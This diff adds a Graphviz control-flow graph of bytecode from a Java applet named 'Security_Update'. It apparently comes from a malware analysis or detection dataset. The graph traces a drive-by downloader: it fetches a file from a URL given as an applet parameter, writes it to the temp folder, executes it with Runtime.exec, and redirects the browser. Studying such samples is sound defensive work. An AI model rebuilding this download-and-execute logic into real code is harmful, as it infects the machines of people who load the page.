@@ -1,0 +1,124 @@
+digraph "" {
+    "r0 := @this: Security_Update"
+    "push \"temp\""
+    "r0 := @this: Security_Update"->"push \"temp\"";
+    "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"
+    "push \"temp\""->"staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>";
+    "push \"\\\\""
+    "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"->"push \"\\\\"";
+    "load.r r0"
+    "push \"\\\\""->"load.r r0";
+    "push \"LINKS\""
+    "load.r r0"->"push \"LINKS\"";
+    "virtualinvoke <Security_Update: java.lang.String getParameter(java.lang.String)>"
+    "push \"LINKS\""->"virtualinvoke <Security_Update: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"
+    "virtualinvoke <Security_Update: java.lang.String getParameter(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
+    "store.r r5"
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"store.r r5";
+    "store.r r5"->"load.r r0";
+    "push \"REDIRECTION\""
+    "load.r r0"->"push \"REDIRECTION\"";
+    "push \"REDIRECTION\""->"virtualinvoke <Security_Update: java.lang.String getParameter(java.lang.String)>";
+    "store.r r20"
+    "virtualinvoke <Security_Update: java.lang.String getParameter(java.lang.String)>"->"store.r r20";
+    "new java.io.FileOutputStream"
+    "store.r r20"->"new java.io.FileOutputStream";
+    "store.r $r11"
+    "new java.io.FileOutputStream"->"store.r $r11";
+    "load.r $r11"
+    "store.r $r11"->"load.r $r11";
+    "load.r r5"
+    "load.r $r11"->"load.r r5";
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"
+    "load.r r5"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "store.r r6"
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"store.r r6";
+    "new java.net.URL"
+    "store.r r6"->"new java.net.URL";
+    "dup1.r"
+    "new java.net.URL"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "push \"TUserver\""
+    "load.r r0"->"push \"TUserver\"";
+    "push \"TUserver\""->"virtualinvoke <Security_Update: java.lang.String getParameter(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
+    "virtualinvoke <Security_Update: java.lang.String getParameter(java.lang.String)>"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>";
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"->"virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>";
+    "store.r r9"
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"->"store.r r9";
+    "push 1024"
+    "store.r r9"->"push 1024";
+    "newarray"
+    "push 1024"->"newarray";
+    "store.r r10"
+    "newarray"->"store.r r10";
+    "goto load.r r9"
+    "store.r r10"->"goto load.r r9";
+    "load.r r9"
+    "goto load.r r9"->"load.r r9";
+    "load.r r10"
+    "load.r r9"->"load.r r10";
+    "push 0"
+    "load.r r10"->"push 0";
+    "push 0"->"load.r r10";
+    "arraylength"
+    "load.r r10"->"arraylength";
+    "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"
+    "arraylength"->"virtualinvoke <java.io.InputStream: int read(byte[],int,int)>";
+    "store.i $i2"
+    "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"->"store.i $i2";
+    "load.i $i2"
+    "store.i $i2"->"load.i $i2";
+    "push -1"
+    "load.i $i2"->"push -1";
+    "ifcmpne.i load.r $r11"
+    "push -1"->"ifcmpne.i load.r $r11";
+    "ifcmpne.i load.r $r11"->"load.r r9";
+    "virtualinvoke <java.io.InputStream: void close()>"
+    "load.r r9"->"virtualinvoke <java.io.InputStream: void close()>";
+    "virtualinvoke <java.io.InputStream: void close()>"->"load.r $r11";
+    "virtualinvoke <java.io.FileOutputStream: void close()>"
+    "load.r $r11"->"virtualinvoke <java.io.FileOutputStream: void close()>";
+    "load.r r6"
+    "virtualinvoke <java.io.FileOutputStream: void close()>"->"load.r r6";
+    "load.r r6"->"load.r r5";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "load.r r5"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "pop"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "pop"->"new java.net.URL";
+    "new java.net.URL"->"dup1.r";
+    "load.r r20"
+    "dup1.r"->"load.r r20";
+    "checkcast"
+    "load.r r20"->"checkcast";
+    "checkcast"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"checkcast";
+    "checkcast"->"store.r r5";
+    "store.r r5"->"load.r r0";
+    "virtualinvoke <Security_Update: java.applet.AppletContext getAppletContext()>"
+    "load.r r0"->"virtualinvoke <Security_Update: java.applet.AppletContext getAppletContext()>";
+    "virtualinvoke <Security_Update: java.applet.AppletContext getAppletContext()>"->"load.r r5";
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"
+    "load.r r5"->"interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1";
+    "goto return"
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"->"store.r r0";
+    "store.r r0"->"return";
+    "ifcmpne.i load.r $r11"->"load.r $r11";
+    "load.r $r11"->"load.r r10";
+    "load.r r10"->"push 0";
+    "push 0"->"load.i $i2";
+    "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"
+    "load.i $i2"->"virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>";
+}
